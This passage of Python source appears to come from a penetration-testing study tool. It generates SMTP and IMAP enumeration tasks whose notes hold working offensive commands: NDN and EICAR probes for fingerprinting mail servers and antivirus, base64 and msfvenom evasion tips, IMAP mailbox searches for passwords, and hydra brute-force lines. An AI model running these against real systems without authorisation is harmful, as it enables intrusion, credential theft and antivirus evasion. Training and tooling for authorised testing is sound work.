- NDN headers reveal internal mail infrastructure

Steps:
1. Identify valid sender domain (check SPF policy first)
2. Send from allowed domain to: nonexistent@{target}
3. Wait for NDN bounce message to YOUR controlled email
4. Analyze NDN headers for:
   - Internal hostnames (Received: headers)
   - Internal IP addresses
   - Mail server software versions
   - Network topology (hops, mail relays)
   - Anti-virus software (X-Virus-Scanned headers)

Example Command (sendEmail):
sendEmail -t nonexistent@{target} -f yourvalid@alloweddomain.com -s {target} -u "Test" -m "Test message" -o tls=no

Example Command (swaks):
swaks --to nonexistent@{target} --from you@yourdomain.com --server {target} --port {port}

TECHNIQUE 3: EICAR AV Detection
- Send email with EICAR test file
- AV software adds headers (X-Virus-Scanned, X-Scanned-By)
- Reveals AV vendor and version
- Known AV vulnerabilities can be researched

EICAR Test String:
X5O!P%@AP[4\\PZX54(P^)7CC)7}}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*

Send EICAR as:
- Email attachment (.txt file)
- Inline in email body
- Base64 encoded (to bypass initial filters)

HEADERS TO ANALYZE:
- Received: <internal-server>.domain.local by <public-mx>.domain.com
  → Reveals internal hostname
- X-Originating-IP: 10.0.1.50
  → Internal IP address
- X-Mailer: Microsoft Exchange Server 2016
  → Mail server version
- X-Virus-Scanned: by av.domain.com (ClamAV 0.99.2)
  → AV software and version

WHY THIS WORKS:
- Email infrastructure must add routing headers
- Bounce messages include diagnostic information
- Often reveals network topology not visible externally

OSCP TIP:
- Document ALL discovered internal hostnames
- Internal IPs may reveal network ranges
- AV versions can be exploited if vulnerable

ETHICAL WARNING:
- Only send emails to domains you're authorized to test
- Use test accounts, not production addresses
- Don't flood with multiple tests (rate limiting)
''',
                        'success_indicators': [
                            'NDN bounce received',
                            'Headers contain internal hostnames',
                            'Internal IP addresses discovered',
                            'AV software identified'
                        ],
                        'failure_indicators': [
                            'Email silently dropped',
                            'No NDN received (strict SPF)',
                            'Minimal header information',
                            'Email rejected immediately'
                        ],
                        'next_steps': [
                            'Document internal hostnames and IPs',
                            'Research identified AV software for CVEs',
                            'Map network topology from Received headers',
                            'Test discovered internal hosts for access'
                        ],
                        'alternatives': [
                            'Web contact forms (trigger email response)',
                            'Request account info (password reset, etc.)',
                            'Phishing simulation (authorized testing only)'
                        ],
                        'estimated_time': '15-30 minutes (including email delivery)'
                    }
                },
                {
                    'id': f'eicar-av-detection-{port}',
                    'name': 'EICAR Test for Anti-Virus Detection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Send EICAR test file to detect and fingerprint AV software',
                        'tags': ['OSCP:MEDIUM', 'RECON'],
                        'notes': f'''
EICAR ANTI-VIRUS DETECTION:

EICAR Test File:
The EICAR (European Institute for Computer Antivirus Research) test file is a standard AV test pattern.
NOT actual malware, but all AV products detect it.

EICAR String (68 bytes):
X5O!P%@AP[4\\PZX54(P^)7CC)7}}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*

DELIVERY METHODS:

1. Email Attachment:
   echo 'X5O!P%@AP[4\\PZX54(P^)7CC)7}}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > eicar.txt
   sendEmail -t contact@{target} -f you@yourdomain.com -s {target} -u "Document" -m "Please review" -a eicar.txt

2. Inline in Email Body:
   swaks --to contact@{target} --from you@yourdomain.com --server {target} --body "X5O!P%@AP[4\\PZX54(P^)7CC)7}}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

3. Base64 Encoded (bypass basic filters):
   echo 'X5O!P%@AP[4\\PZX54(P^)7CC)7}}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | base64

WHAT TO LOOK FOR:

Successful Detection:
- NDN bounce with AV headers:
  X-Virus-Scanned: by av.domain.com (ClamAV 0.99.2)
  X-Scanned-By: MIMEDefang 2.84 on mail.domain.com
  X-Spam-Status: Yes, score=1000
  X-Antivirus: Kaspersky Endpoint Security 11.x
  X-EICAR: Detected

Bypassed Filters:
- Email delivered (no bounce)
- No AV headers added
- Weak/missing AV protection

INFORMATION GATHERED:
- AV vendor (ClamAV, Kaspersky, Sophos, etc.)
- AV version number
- MIMEDefang / MailScanner presence
- Spam filter configuration
- Email gateway info

NEXT STEPS:
1. Research identified AV version for CVEs
   searchsploit <AV-NAME> <VERSION>

2. Check for known bypasses
   - File type confusion (.docx vs .doc)
   - Archive evasion (.zip, .7z with password)
   - Macro obfuscation techniques

3. Adapt payload if AV identified
   - Craft payloads to evade specific AV
   - Use msfvenom encoders for known AV
   - Test payloads offline with same AV version

KNOWN VULNERABLE AVs:
- ClamAV < 0.103 (multiple CVEs)
- Sophos < specific versions
- Legacy AV engines

OSCP RELEVANCE: Medium
- Helps craft payloads for post-exploitation
- Identifies email filtering for phishing vectors
- AV version research can reveal critical CVEs
''',
                        'success_indicators': [
                            'Email blocked with AV warning',
                            'X-Virus-Scanned header present',
                            'AV vendor and version identified',
                            'NDN bounce with detection notice'
                        ],
                        'failure_indicators': [
                            'Email delivered (no AV)',
                            'EICAR not detected (misconfigured AV)',
                            'No diagnostic headers'
                        ],
                        'alternatives': [
                            'Send document with macro',
                            'Test with .exe attachment (if allowed)',
                            'Upload EICAR via web form'
                        ]
                    }
                }
            ]
        })

        # Task 12: IMAP Enumeration (if related email service detected)
        # Add lightweight IMAP support since it's email-related
        tasks['children'].append({
            'id': f'imap-enum-{port}',
            'name': 'IMAP Enumeration (Email Retrieval)',
            'type': 'parent',
            'children': [
                {
                    'id': f'imap-banner-{port}',
                    'name': 'IMAP Banner Grabbing',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Connect to IMAP service (ports 143, 993) for banner and version',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL'],
                        'notes': f'''
IMAP (Internet Message Access Protocol):
- Port 143: IMAP (plaintext)
- Port 993: IMAPS (SSL/TLS)

Purpose: Users retrieve/access emails stored on server (vs SMTP for sending)

BANNER GRABBING:

Port 143 (plaintext):
nc -nv {target} 143

Port 993 (SSL/TLS):
openssl s_client -connect {target}:993 -quiet

Expected Response:
* OK The Microsoft Exchange IMAP4 service is ready.
* OK Dovecot ready.
* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR ...]

NTLM Info Disclosure (Windows IMAP):
Same technique as SMTP:
telnet {target} 143
>> a1 AUTHENTICATE NTLM
+
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
(Server leaks internal hostname, domain, Windows version)

Or automated:
nmap -p143 --script imap-ntlm-info {target}

IMAP Commands (Basic):
A1 LOGIN username password
A1 LIST "" *                (list mailboxes)
A1 SELECT INBOX             (select inbox)
A1 FETCH 1:* (FLAGS)        (list messages)
A1 FETCH 2 BODY[TEXT]       (read message 2)
A1 LOGOUT

OSCP TIP:
- If you find credentials (web, SMB, etc.), try on IMAP
- Emails may contain sensitive info (passwords, network diagrams)
- Drafts folder often has saved credentials

WHY RELEVANT:
- Access emails via compromised credentials
- Exfiltrate sensitive communications
- Find additional credentials in emails
- Discover internal network information
''',
                        'success_indicators': [
                            'IMAP banner received',
                            'CAPABILITY response shows features',
                            'NTLM info leaked (Windows)'
                        ],
                        'failure_indicators': [
                            'Connection refused (no IMAP)',
                            'Firewall blocking',
                            'SSL/TLS handshake failed'
                        ],
                        'next_steps': [
                            'Test discovered credentials on IMAP',
                            'Brute-force if default creds fail',
                            'Enumerate mailboxes if access gained',
                            'Search emails for sensitive data'
                        ],
                        'alternatives': [
                            'nmap -p143,993 --script imap-capabilities {target}',
                            'Evolution GUI mail client (apt install evolution)',
                            'curl -k "imaps://{target}/INBOX?ALL" --user user:pass'
                        ]
                    }
                },
                {
                    'id': f'imap-credential-test-{port}',
                    'name': 'IMAP Credential Testing',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test credentials discovered elsewhere on IMAP service',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'notes': '''
CREDENTIAL TESTING ON IMAP:

If you've found credentials from:
- SMB enumeration
- Web app exploitation
- SQL injection
- Default credentials
- Password spraying

→ TEST THEM ON IMAP!

Why:
- Users often reuse passwords across services
- Email access reveals sensitive communications
- Emails may contain:
  * Additional credentials
  * VPN configs
  * Network diagrams
  * Confidential business data

Manual Test:
nc -nv <IP> 143
A1 LOGIN username password
(If successful: A1 OK LOGIN Ok)

Automated Test (curl):
curl -k 'imap://<IP>/' --user username:password
(Lists mailboxes if successful)

Read First Email:
curl -k 'imap://<IP>/INBOX;MAILINDEX=1' --user username:password

Search for Keywords:
curl -k 'imap://<IP>/INBOX?TEXT password' --user username:password

Brute-force (if authorized):
hydra -L users.txt -P passwords.txt <IP> imap
nmap -p143 --script imap-brute <IP>

OSCP EXAM TIP:
- Always test credentials across all services
- Email folders to check: Inbox, Drafts, Sent Items
- Search for keywords: password, credentials, vpn, admin
- Document email sources properly for report
''',
                        'success_indicators': [
                            'LOGIN successful',
                            'Mailbox list retrieved',
                            'Emails accessible'
                        ],
                        'failure_indicators': [
                            'Authentication failed',
                            'Account locked',
                            'Credentials invalid'
                        ],
                        'alternatives': [
                            'Evolution GUI (user-friendly)',
                            'Thunderbird mail client',
                            'Metasploit: auxiliary/scanner/imap/imap_version'
                        ]
                    }
                }
            ]
        })

        # Task 13: Exploit Research (if version detected)
        if version:
            tasks['children'].append({
                'id': f'exploit-research-{port}',
                'name': f'Exploit Research: {version}',
                'type': 'parent',
                'children': [
                    {
                        'id': f'searchsploit-smtp-{port}',
                        'name': f'SearchSploit: {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit {version}',
                            'description': 'Search ExploitDB for known SMTP vulnerabilities',
                            'tags': ['OSCP:HIGH', 'RESEARCH'],
                            'success_indicators': [
                                'Exploits found for version',
                                'CVE numbers identified',
                                'PoC code available'
                            ],
                            'failure_indicators': [
                                'No exploits found',
                                'Version too new/old',
                                'Search returned unrelated results'
                            ],
                            'next_steps': [
                                'Review exploit code for applicability',
                                'Test PoC in safe environment first',
                                'Check exploit prerequisites',
                                'Read exploit documentation'
                            ],
                            'alternatives': [
                                f'searchsploit {product}',
                                'Google: "{version} exploit"',
                                'exploit-db.com search'
                            ]
                        }
                    },
                    {
                        'id': f'cve-lookup-smtp-{port}',
                        'name': f'CVE Lookup: {version}',
                        'type': 'manual',
                        'metadata': {
                            'description': 'Search CVE databases for version-specific vulnerabilities',
                            'tags': ['RESEARCH', 'OSCP:HIGH'],
                            'notes': f'''
Research {version} vulnerabilities:

1. CVE Search:
   - cve.mitre.org
   - nvd.nist.gov
   - cvedetails.com

2. Search Terms:
   - "{version} vulnerability"
   - "{product} exploit"
   - "{version} CVE"

3. GitHub:
   - github.com/search?q={version}+exploit

Known SMTP Vulnerabilities to Check:
- Buffer overflows (old Sendmail versions)
- Command injection (VRFY/EXPN vulnerabilities)
- Authentication bypass
- Remote code execution
- SMTP Smuggling (parser desynchronization)

Common Vulnerable Versions:
- Sendmail < 8.12.9 (multiple CVEs)
- Exim < 4.92 (CVE-2019-10149 RCE)
- OpenSMTPD < 6.6.2 (CVE-2020-7247 RCE)
- Haraka < 2.8.9 (CVE-2016-1000282 RCE)

Next Steps:
- Download PoC exploits
- Verify version match
- Test in isolated environment
- Document exploit path
''',
                            'success_indicators': [
                                'CVE found for exact version',
                                'Exploit available',
                                'Verified vulnerability applies'
                            ]
                        }
                    }
                ]
            })

        return tasks
